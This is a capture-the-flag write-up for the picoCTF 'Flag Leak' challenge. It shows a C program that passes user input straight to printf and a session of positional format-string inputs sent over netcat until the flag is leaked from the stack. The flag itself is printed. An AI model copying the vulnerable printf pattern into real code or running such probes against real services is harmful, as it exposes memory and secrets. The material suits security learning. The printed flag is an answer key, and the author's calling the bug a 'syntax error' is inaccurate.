# Flag Leak

In this challenge there were 2 files, `vuln` and `vuln.c`. There was a NetCatlink to connect to the challenge as well. 

So using that link I ran the challenge and then I was encountered with a prompt to tell a story so I tested it out.

```
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 49278
Tell me a story and then I'll tell you one >> hello
Here's a story -
hello
```

I tried some other words too and as expected it kept returning them back. So I opened its source file to have a look at the code.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```

Looking through the code I found out that, there was a syntax error in the `printf(story)` line. There was no `%s` before the `story` variable. 

I looked up this error on the web and it was labelled as a format string vulnerability. This [Website](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)
explained in detail what they were and how can I exploit one. Using the information given in this website, I used trial and error to figure out the flag and after a long time I finally found the flag.

```
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %1$s
Here's a story -
%1$s
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %2$s
Here's a story -
���
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %3$s
Here's a story -
�ú,
```
..............
```
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %12$s
Here's a story -

coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %13$s
Here's a story -
(null)
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %14$s
Here's a story -
```
......
```
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %22$s
Here's a story -
setresgid
coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %23$s
Here's a story -

coolguy24@Vedant-Laptop:~$ nc saturn.picoctf.net 54451
Tell me a story and then I'll tell you one >> %24$s
Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
```

`FLAG:picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}`
